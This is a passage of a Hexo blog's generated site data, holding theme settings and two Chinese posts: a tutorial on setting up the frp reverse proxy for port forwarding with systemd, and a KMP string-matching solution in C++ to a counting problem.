50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":2202,"excerpt":"<h1 id=\"名词解释\"><a href=\"#名词解释\" class=\"headerlink\" title=\"名词解释\"></a>名词解释</h1><p>&emsp;&emsp;<strong>端口映射</strong>就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。端口映射有动态和静态之分。<br>&emsp;&emsp;通俗来讲，端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；利用端口映射功能还可以将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口。 端口映射功能还可以完成一些特定代理功能，比如代理POP，SMTP，TELNET等协议。理论上可以提供65535(总端口数)-1024(保留端口数)=64511个端口的映射。</p>\n<p>&emsp;&emsp;<strong>内网穿透</strong>，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透。就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p>","more":"<h1 id=\"方式\"><a href=\"#方式\" class=\"headerlink\" title=\"方式\"></a>方式</h1><h2 id=\"FRP\"><a href=\"#FRP\" class=\"headerlink\" title=\"FRP\"></a>FRP</h2><p>&emsp;&emsp;假如你有一个有公网IP的服务器，并且网速不是太差的话，frp就是一个不错的选择，当然如果没有的话，可以用后面的方法。</p>\n<h3 id=\"下载frp\"><a href=\"#下载frp\" class=\"headerlink\" title=\"下载frp\"></a>下载frp</h3><blockquote>\n<p>frp项目地址：<a href=\"https://github.com/fatedier/frp\">https://github.com/fatedier/frp</a></p>\n</blockquote>\n<p>进入realses界面下载需要的版本，下载完成后分别解压到服务器和客户端上。<br>这里以linux（服务器），windows(客户端)为例。</p>\n<h3 id=\"linux服务器上配置\"><a href=\"#linux服务器上配置\" class=\"headerlink\" title=\"linux服务器上配置\"></a>linux服务器上配置</h3><p>下载并解压文件。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span><br><span class=\"line\">tar xzvf frp_0.29.0_linux_amd64.tar.gz</span><br><span class=\"line\"><span class=\"comment\"># 可以给文件夹改个短点的名字</span></span><br><span class=\"line\">mv frp_0.29.0_linux_amd64 frp</span><br></pre></td></tr></table></figure><br>配置服务端frp配置文件。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> frp</span><br><span class=\"line\">vim frps.ini</span><br></pre></td></tr></table></figure><br>按 $I$ 键进入插入模式，输入以下内容。<br><figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[common]</span></span><br><span class=\"line\"><span class=\"attr\">bind_port</span> = <span class=\"number\">7000</span>  <span class=\"comment\"># 默认监听端口，为服务器和客户端通信的端口，可以根据实际情况进行更改。</span></span><br><span class=\"line\"><span class=\"attr\">token</span> = <span class=\"number\">12345678</span>  <span class=\"comment\"># 认证秘钥，客户端需与服务端一致才可以连接，可以不写这一行。</span></span><br></pre></td></tr></table></figure><br>按 $Esc$ 退出插入模式，并输入”:wq”保存（w）并退出（q），不包括引号。<br>至此，服务端已配置完毕，接下来运行即可。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./frps -c frps.ini <span class=\"comment\"># 运行时需保持终端打开，否则会结束运行。Ctrl+C手动结束运行。</span></span><br><span class=\"line\">nohup ./frps -c frps.ini <span class=\"comment\"># 放到后台运行，服务器重启需重新执行。</span></span><br></pre></td></tr></table></figure><br>以上方式运行未免还是有些不方便，所以最好将其写入到systemd服务。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/systemd/system/frps.service</span><br></pre></td></tr></table></figure><br>写入以下内容。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description&#x3D;frps daemon    # 服务名称，随便填写即可</span><br><span class=\"line\">After&#x3D;syslog.target  network.target</span><br><span class=\"line\">Wants&#x3D;network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type&#x3D;simple</span><br><span class=\"line\">ExecStart&#x3D;&#x2F;root&#x2F;frp&#x2F;frps -c &#x2F;root&#x2F;frp&#x2F;frps.ini   # 修改为你的frps的绝对路径</span><br><span class=\"line\">Restart&#x3D; always</span><br><span class=\"line\">RestartSec&#x3D;1min</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><br>启动服务，并设置开及自动运行。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo systemctl daemon-reload        <span class=\"comment\"># 重新加载服务</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> frps.service  <span class=\"comment\"># 开机自启</span></span><br><span class=\"line\">sudo systemctl start frps           <span class=\"comment\"># 启动服务</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"windows客户端上配置\"><a href=\"#windows客户端上配置\" class=\"headerlink\" title=\"windows客户端上配置\"></a>windows客户端上配置</h3><p>配置客户端frp配置文件，编辑 frpc.ini。<br><figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[common]</span></span><br><span class=\"line\"><span class=\"attr\">server_addr</span> = <span class=\"number\">0.0</span>.<span class=\"number\">0.0</span>  <span class=\"comment\"># 服务器IP地址或域名</span></span><br><span class=\"line\"><span class=\"attr\">server_port</span> = <span class=\"number\">7000</span>     <span class=\"comment\"># 服务器监听端口</span></span><br><span class=\"line\"><span class=\"attr\">token</span> = <span class=\"number\">12345678</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[mc]</span>   <span class=\"comment\"># 此处名称随意</span></span><br><span class=\"line\"><span class=\"attr\">type</span> = tcp  <span class=\"comment\"># 协议类型，如udp，http，https，stpx，xtcp</span></span><br><span class=\"line\"><span class=\"attr\">local_port</span> = <span class=\"number\">25565</span>       <span class=\"comment\"># 本地监听端口</span></span><br><span class=\"line\"><span class=\"attr\">remote_port</span> = <span class=\"number\">25565</span>      <span class=\"comment\"># 服务器转发端口</span></span><br><span class=\"line\"><span class=\"attr\">custom_domains</span> = domain  <span class=\"comment\"># 服务器域名</span></span><br></pre></td></tr></table></figure><br>至此，客户端也配置完毕了，进入到frp文件夹，在此处打开cmd，或powershell。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\frpc -c frpc.ini</span><br></pre></td></tr></table></figure><br>运行以上内容即可，窗口关闭即结束，也可以写入到 run.bat 双击执行。<br>接下来就可以愉快的玩耍了。</p>\n<p><strong>注：详细配置文件参照frps_full.ini和frpc_full.ini</strong></p>\n<h2 id=\"其他方式\"><a href=\"#其他方式\" class=\"headerlink\" title=\"其他方式\"></a>其他方式</h2><h3 id=\"花生壳\"><a href=\"#花生壳\" class=\"headerlink\" title=\"花生壳\"></a>花生壳</h3><blockquote>\n<p>官网：<a href=\"https://hsk.oray.com\">https://hsk.oray.com</a></p>\n</blockquote>\n<p>一次性付费开通服务，1Mbps带宽，每月1G流量。</p>\n<h3 id=\"蒲公英\"><a href=\"#蒲公英\" class=\"headerlink\" title=\"蒲公英\"></a>蒲公英</h3><blockquote>\n<p>官网：<a href=\"https://pgy.oray.com\">https://pgy.oray.com</a></p>\n</blockquote>\n<p>免费，仅限三人互相访问，1Mbps带宽。</p>\n<p><strong>还有其他免费平台自行百度即可，此处就不多赘述。</strong></p>"},{"title":"剪花布条","date":"2019-03-29T09:11:09.000Z","abbrlink":"8da1c66a","_content":"# Description\n{% blockquote %}\n一块花布条，里面有些图案，另有一块直接可用的小饰条，里面也有一些图案。对于给定的花布条和小饰条，计算一下能从花布条中尽可能剪出几块小饰条来呢？\n{% endblockquote %}\n<!--more-->\n# Input\n{% blockquote %}\n输入中含有一些数据，分别是成对出现的花布条和小饰条，其布条都是用可见ASCII字符表示的，可见的ASCII字符有多少个，布条的花纹也有多少种花样。花纹条和小饰条不会超过1000个字符长。如果遇见#字符，则不再进行工作。\n{% endblockquote %}\n# Output\n{% blockquote %}\n输出能从花纹布中剪出的最多小饰条个数，如果一块都没有，那就老老实实输出0，每个结果之间应换行。\n{% endblockquote %}\n# Sample Input\n```nohilight\nabcde a3\naaaaaa  aa\n#\n```\n# Sample Output\n```nohilight\n0\n3\n```\n# Code\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\nstring a,b;\nint NEXT[1020];\nvoid get()\n{\n    int i=0,j=-1;\n    NEXT[i]=j;\n    while(i<b.length()){\n        if(j==-1||b[i]==b[j]){\n            i++;j++;\n            NEXT[i]=j;\n        }\n        else j=NEXT[j];\n    }\n}\nint kmp()\n{\n    get();\n    int i=0,j=0,ans=0;\n    while(i<a.length())\n    {\n        if(j==-1||a[i]==b[j])\n        {\n            i++;j++;\n            if(j==b.length())\n            {\n                ans++;\n                j=0;\n            }\n        }\n        else j=NEXT[j];\n    }\n    return ans;\n}\nint main()\n{\n    while(cin>>a)\n    {\n        if(a[0]=='#')break;\n        cin>>b;\n        cout<<kmp()<<endl;\n    }\n    return 0;\n}\n```\n\n","source":"_posts/剪花布条.md","raw":"---\ntitle: 剪花布条\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - KMP\nabbrlink: 8da1c66a\n---\n# Description\n{% blockquote %}\n一块花布条，里面有些图案，另有一块直接可用的小饰条，里面也有一些图案。对于给定的花布条和小饰条，计算一下能从花布条中尽可能剪出几块小饰条来呢？\n{% endblockquote %}\n<!--more-->\n# Input\n{% blockquote %}\n输入中含有一些数据，分别是成对出现的花布条和小饰条，其布条都是用可见ASCII字符表示的，可见的ASCII字符有多少个，布条的花纹也有多少种花样。花纹条和小饰条不会超过1000个字符长。如果遇见#字符，则不再进行工作。\n{% endblockquote %}\n# Output\n{% blockquote %}\n输出能从花纹布中剪出的最多小饰条个数，如果一块都没有，那就老老实实输出0，每个结果之间应换行。\n{% endblockquote %}\n# Sample Input\n```nohilight\nabcde a3\naaaaaa  aa\n#\n```\n# Sample Output\n```nohilight\n0\n3\n```\n# Code\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\nstring a,b;\nint NEXT[1020];\nvoid get()\n{\n    int i=0,j=-1;\n    NEXT[i]=j;\n    while(i<b.length()){\n        if(j==-1||b[i]==b[j]){\n            i++;j++;\n            NEXT[i]=j;\n        }\n        else j=NEXT[j];\n    }\n}\nint kmp()\n{\n    get();\n    int i=0,j=0,ans=0;\n    while(i<a.length())\n    {\n        if(j==-1||a[i]==b[j])\n        {\n            i++;j++;\n            if(j==b.length())\n            {\n                ans++;\n                j=0;\n            }\n        }\n        else j=NEXT[j];\n    }\n    return ans;\n}\nint main()\n{\n    while(cin>>a)\n    {\n        if(a[0]=='#')break;\n        cin>>b;\n        cout<<kmp()<<endl;\n    }\n    return 0;\n}\n```\n\n","slug":"剪花布条","published":1,"updated":"2020-05-11T09:48:56.949Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkc2002zqse58gzrgpch","content":"<h1 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h1><blockquote><p>一块花布条，里面有些图案，另有一块直接可用的小饰条，里面也有一些图案。对于给定的花布条和小饰条，计算一下能从花布条中尽可能剪出几块小饰条来呢？</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"Input\"><a href=\"#Input\" class=\"headerlink\" title=\"Input\"></a>Input</h1><blockquote><p>输入中含有一些数据，分别是成对出现的花布条和小饰条，其布条都是用可见ASCII字符表示的，可见的ASCII字符有多少个，布条的花纹也有多少种花样。花纹条和小饰条不会超过1000个字符长。如果遇见#字符，则不再进行工作。</p>\n</blockquote>\n<h1 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h1><blockquote><p>输出能从花纹布中剪出的最多小饰条个数，如果一块都没有，那就老老实实输出0，每个结果之间应换行。</p>\n</blockquote>\n<h1 id=\"Sample-Input\"><a href=\"#Sample-Input\" class=\"headerlink\" title=\"Sample Input\"></a>Sample Input</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">abcde a3</span><br><span class=\"line\">aaaaaa  aa</span><br><span class=\"line\">#</span><br></pre></td></tr></table></figure>\n<h1 id=\"Sample-Output\"><a href=\"#Sample-Output\" class=\"headerlink\" title=\"Sample Output\"></a>Sample Output</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0</span><br><span class=\"line\">3</span><br></pre></td></tr></table></figure>\n<h1 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"built_in\">string</span> a,b;</span><br><span class=\"line\"><span class=\"keyword\">int</span> NEXT[<span class=\"number\">1020</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">get</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    NEXT[i]=j;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;b.length())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||b[i]==b[j])&#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">            NEXT[i]=j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">kmp</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    get();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">0</span>,ans=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;a.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||a[i]==b[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(j==b.length())</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                ans++;</span><br><span class=\"line\">                j=<span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;a)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a[<span class=\"number\">0</span>]==<span class=\"string\">&#x27;#&#x27;</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;b;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;kmp()&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || 